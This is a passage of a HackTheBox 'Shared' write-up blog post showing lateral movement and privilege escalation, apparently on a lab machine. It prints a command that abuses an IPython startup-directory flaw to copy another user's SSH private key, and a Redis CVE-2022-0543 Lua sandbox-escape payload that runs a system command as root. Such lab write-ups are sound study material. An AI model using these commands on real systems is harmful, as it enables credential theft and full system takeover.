+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh james_mason@shared.htb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/hackthebox-shared/12.png" title="SSH" data-thumbnail="/hackthebox-shared/12.png" data-sub-html="<h2>SSH</h2><p>SSH</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shared/12.png"
+            data-srcset="/hackthebox-shared/12.png, /hackthebox-shared/12.png 1.5x, /hackthebox-shared/12.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shared/12.png" width="1328" height="498" />
+    </a><figcaption class="image-caption">SSH</figcaption>
+    </figure></p>
+<p>And we are in!</p>
+<p>Checking the <code>id</code> command we are part of a group <code>developer</code>.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-shared/13.png" title="id" data-thumbnail="/hackthebox-shared/13.png" data-sub-html="<h2>id</h2><p>id</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shared/13.png"
+            data-srcset="/hackthebox-shared/13.png, /hackthebox-shared/13.png 1.5x, /hackthebox-shared/13.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shared/13.png" width="1188" height="61" />
+    </a><figcaption class="image-caption">id</figcaption>
+    </figure></p>
+<p>Looking for files and folders associated with the group <code>developer</code>.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-shared/14.png" title="find" data-thumbnail="/hackthebox-shared/14.png" data-sub-html="<h2>find</h2><p>find</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shared/14.png"
+            data-srcset="/hackthebox-shared/14.png, /hackthebox-shared/14.png 1.5x, /hackthebox-shared/14.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shared/14.png" width="817" height="61" />
+    </a><figcaption class="image-caption">find</figcaption>
+    </figure></p>
+<p>Visiting the above folder, it contained no files.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-shared/15.png" title="/opt/scripts_review" data-thumbnail="/hackthebox-shared/15.png" data-sub-html="<h2>/opt/scripts/review</h2><p>/opt/scripts_review</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shared/15.png"
+            data-srcset="/hackthebox-shared/15.png, /hackthebox-shared/15.png 1.5x, /hackthebox-shared/15.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shared/15.png" width="870" height="111" />
+    </a><figcaption class="image-caption">/opt/scripts/review</figcaption>
+    </figure></p>
+<p>Since I couldn&rsquo;t find anything else, I simply ran <code>pspy</code> to monitor the system processes.</p>
+<p>Monitoring the processes, there are a few processes running with <code>UID=1001</code>.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-shared/16.png" title="pspy" data-thumbnail="/hackthebox-shared/16.png" data-sub-html="<h2>pspy</h2><p>pspy</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shared/16.png"
+            data-srcset="/hackthebox-shared/16.png, /hackthebox-shared/16.png 1.5x, /hackthebox-shared/16.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shared/16.png" width="1366" height="137" />
+    </a><figcaption class="image-caption">pspy</figcaption>
+    </figure></p>
+<p>Since it&rsquo;s running <code>ipython</code> I tried looking for vulnerabilities in ipython and came accross the following vulnerability.</p>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>Security Advisory<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">We’d like to disclose an arbitrary code execution vulnerability in IPython that stems from IPython executing untrusted files in CWD. This vulnerability allows one user to run code as another.</div>
+        </div>
+    </div>
+<p>Source: <a href="https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x" target="_blank" rel="noopener noreffer ">https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x</a></p>
+<p>Following the above article, we can run the below commands in <code>/opt/scripts_review/</code> directory to extract the ssh private key of user <code>dan_smith</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir -m <span class="m">777</span> profile_default
+</span></span><span class="line"><span class="cl">mkdir -m <span class="m">777</span> profile_default/startup
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;import os; os.system(&#39;cat ~/.ssh/id_rsa &gt; /tmp/key&#39;)&#34;</span> &gt; profile_default/startup/foo.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After a while, we can see the key in <code>/tmp</code> directory.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-shared/17.png" title="RSA Private Key" data-thumbnail="/hackthebox-shared/17.png" data-sub-html="<h2>RSA Private Key</h2><p>RSA Private Key</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shared/17.png"
+            data-srcset="/hackthebox-shared/17.png, /hackthebox-shared/17.png 1.5x, /hackthebox-shared/17.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shared/17.png" width="1244" height="427" />
+    </a><figcaption class="image-caption">RSA Private Key</figcaption>
+    </figure></p>
+<h2 id="usertxt">user.txt</h2>
+<p><figure><a class="lightgallery" href="/hackthebox-shared/18.png" title="user.txt" data-thumbnail="/hackthebox-shared/18.png" data-sub-html="<h2>user.txt</h2><p>user.txt</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shared/18.png"
+            data-srcset="/hackthebox-shared/18.png, /hackthebox-shared/18.png 1.5x, /hackthebox-shared/18.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shared/18.png" width="1261" height="326" />
+    </a><figcaption class="image-caption">user.txt</figcaption>
+    </figure></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Again looking at the <code>id</code> command we are part of a new group <code>sysadmin</code></p>
+<p><figure><a class="lightgallery" href="/hackthebox-shared/19.png" title="Group sysadmin" data-thumbnail="/hackthebox-shared/19.png" data-sub-html="<h2>Group sysadmin</h2><p>Group sysadmin</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shared/19.png"
+            data-srcset="/hackthebox-shared/19.png, /hackthebox-shared/19.png 1.5x, /hackthebox-shared/19.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shared/19.png" width="1009" height="94" />
+    </a><figcaption class="image-caption">Group sysadmin</figcaption>
+    </figure></p>
+<p>Looking for files and folders of belonging to this group, We found a binary <code>redis_connector_dev</code>.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-shared/20.png" title="/usr/local/bin/redis_connector_dev" data-thumbnail="/hackthebox-shared/20.png" data-sub-html="<h2>/usr/local/bin/redis_connector_dev</h2><p>/usr/local/bin/redis_connector_dev</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shared/20.png"
+            data-srcset="/hackthebox-shared/20.png, /hackthebox-shared/20.png 1.5x, /hackthebox-shared/20.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shared/20.png" width="1089" height="90" />
+    </a><figcaption class="image-caption">/usr/local/bin/redis_connector_dev</figcaption>
+    </figure></p>
+<p>Running the binary, I noticed that it is logging to redis using a password.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-shared/21.png" title="running redis_connector_dev binary" data-thumbnail="/hackthebox-shared/21.png" data-sub-html="<h2>[running redis_connector_dev binary</h2><p>running redis_connector_dev binary</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shared/21.png"
+            data-srcset="/hackthebox-shared/21.png, /hackthebox-shared/21.png 1.5x, /hackthebox-shared/21.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shared/21.png" width="1263" height="429" />
+    </a><figcaption class="image-caption">[running redis_connector_dev binary</figcaption>
+    </figure></p>
+<p>Running the binary locally, it is establishing a connection on port <code>6379</code> which is used by redis-cli.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-shared/22.png" title="running redis_connector_dev binary locally" data-thumbnail="/hackthebox-shared/22.png" data-sub-html="<h2>running redis_connector_dev binary locally</h2><p>running redis_connector_dev binary locally</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shared/22.png"
+            data-srcset="/hackthebox-shared/22.png, /hackthebox-shared/22.png 1.5x, /hackthebox-shared/22.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shared/22.png" width="1131" height="153" />
+    </a><figcaption class="image-caption">running redis_connector_dev binary locally</figcaption>
+    </figure></p>
+<p>I opened port <code>6379</code> using <code>nc</code> and ran the binary again. This time it showd some output on the listening end a string which could be the password.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-shared/23.png" title="nc on port 6379" data-thumbnail="/hackthebox-shared/23.png" data-sub-html="<h2>nc on port 6379</h2><p>nc on port 6379</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shared/23.png"
+            data-srcset="/hackthebox-shared/23.png, /hackthebox-shared/23.png 1.5x, /hackthebox-shared/23.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shared/23.png" width="585" height="199" />
+    </a><figcaption class="image-caption">nc on port 6379</figcaption>
+    </figure></p>
+<p>Looking for vulnerabilities in redis-cli I came across <code>CVE-2022-0543</code>.</p>
+<p>With this vulnerability we can execute system commands. You can read about this vulnerability from <a href="https://thesecmaster.com/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis/" target="_blank" rel="noopener noreffer ">here</a>.</p>
+<h2 id="roottxt">root.txt</h2>
+<p>First we need to run redis-cli with the password we found above.</p>
+<p>Then we enter the following command to retrieve the root flag.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">eval &#39;local io_l = package.loadlib(&#34;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&#34;, &#34;luaopen_io&#34;); local io = io_l(); local f = io.popen(&#34;cat /root/root.txt&#34;, &#34;r&#34;); local res = f:read(&#34;*a&#34;); f:close(); return res&#39; 0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/hackthebox-shared/24.png" title="root.txt" data-thumbnail="/hackthebox-shared/24.png" data-sub-html="<h2>root.txt</h2><p>root.txt</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shared/24.png"
+            data-srcset="/hackthebox-shared/24.png, /hackthebox-shared/24.png 1.5x, /hackthebox-shared/24.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shared/24.png" width="1349" height="455" />
+    </a><figcaption class="image-caption">root.txt</figcaption>
+    </figure></p>
+<p><strong>Thanks for reading!</strong></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-11-12</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/hackthebox-shared/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="/hackthebox-shared/" data-title="Hackthebox - Shared" data-via="ssaadakhtarr" data-hashtags="hackthebox,machines"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="/hackthebox-shared/" data-hashtag="hackthebox"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="/hackthebox-shared/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/hackthebox/">hackthebox</a>,&nbsp;<a href="/tags/machines/">machines</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/hackthebox-trick/" class="prev" rel="prev" title="HackTheBox - Trick"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>HackTheBox - Trick</a>
+            <a href="/hackthebox-carpediem/" class="next" rel="next" title="HackTheBox - Carpediem">HackTheBox - Carpediem<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.105.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Saad Akhtar</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.en","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
